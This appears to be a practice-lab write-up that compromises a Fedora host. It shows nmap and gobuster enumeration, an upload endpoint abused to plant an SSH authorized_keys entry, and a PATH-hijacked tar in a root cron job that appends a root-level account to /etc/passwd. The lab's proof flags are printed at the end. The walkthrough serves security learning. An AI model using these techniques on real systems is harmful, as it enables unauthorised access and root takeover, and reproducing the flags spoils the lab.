```
---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
21/tcp    open  ftp
25022/tcp open  unknown
33414/tcp open  unknown
40080/tcp open  unknown

Making a script scan on extra ports: 25022, 33414, 40080

PORT      STATE SERVICE VERSION
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open  unknown
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Fri, 01 Mar 2024 14:48:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE

```

The FTP on port 21 can be logged into anonymously but there is an error getting the directory listing.
SSH is running on port 25022. 
Port 33414 has a webserver running but there is nothing in the root of it. 

GoBuster it
```
gobuster dir -u http://192.168.217.249:33414 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt,zip -t 150 -b '403,404' -r
```

This returns just two things
/help and /info

/help shows us these options
`"GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]`

We can get directory listings but not view files. We can read /home/alfredo/.ssh so maybe we can write to it.

Let's generate an SSH key.
```
ssh-keygen
```
```
```

```Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/user/.ssh/id_ed25519): 
/home/user/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/user/.ssh/id_ed25519
Your public key has been saved in /home/user/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:32jUrtkebCjhIwNneQObOPKKDcpqA2PEL7OIyK++XbU user@kalipurple
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|.     .          |
| o   . =   .     |
|. o + *.S . .    |
|o+ + =.o.= *     |
|O.+ ..oE+ = *    |
|*O...  o + = .   |
|B=Bo      o.o    |
+----[SHA256]-----+
```

```
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@/home/user/.ssh/id_ed25519.pub" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.217.249:33414/file-upload 
```

It shows us that it's not an accepted file
`{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}`

Let's make it a txt and upload it
```
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@/home/user/.ssh/id_rsa.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.217.249:33414/file-upload 
HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Fri, 01 Mar 2024 17:01:48 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```

This works so let's SSH into the machine
```
ssh -i /home/user/.ssh/id_ed25519 alfredo@192.168.217.249 -p 25022
```

We're in!
`[alfredo@fedora ~]$`

Check crontab - it looks like root runs a .sh file
```
[alfredo@fedora ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh
```

Tar isn't an exact path and we can write to this path so we can create our own tar that will run

```
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

CD to the restapi folder and create a .sh named tar that will add the user dbl with password `password` adding it to the users list
```
[alfredo@fedora ~]$ cd restapi
[alfredo@fedora restapi]$ pwd
/home/alfredo/restapi
[alfredo@fedora restapi]$ echo 'echo "dbl:\$1\$dbl\$HDDAaqA2syu7zGMsMXbcd0:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd >/dev/null' > tar
[alfredo@fedora restapi]$ chmod +x tar
```

```
[alfredo@fedora restapi]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
systemd-oom:x:998:996:systemd Userspace OOM Killer:/:/sbin/nologin
systemd-timesync:x:997:995:systemd Time Synchronization:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:996:994:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
cockpit-ws:x:995:991:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:994:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:993:989::/var/lib/setroubleshoot:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
dnsmasq:x:992:988:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
chrony:x:991:987::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-network:x:985:985:systemd Network Management:/:/usr/sbin/nologin
unbound:x:984:984:Unbound DNS resolver:/etc/unbound:/sbin/nologin
clevis:x:983:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin
alfredo:x:1000:1000::/home/alfredo:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
dbl:$1$dbl$HDDAaqA2syu7zGMsMXbcd0:0:0:root:/root:/bin/bash
```

SU to the user we created and get the flags
```
[alfredo@fedora restapi]$ su dbl
Password: 
[root@fedora restapi]# cat /root/proof.txt
4875baa8ab161bb8976f063ca695d421
[root@fedora restapi]# cat /home/alfredo/local.txt
9a2bb3d1dc0dfa1e82c25ac776ed37f0
```
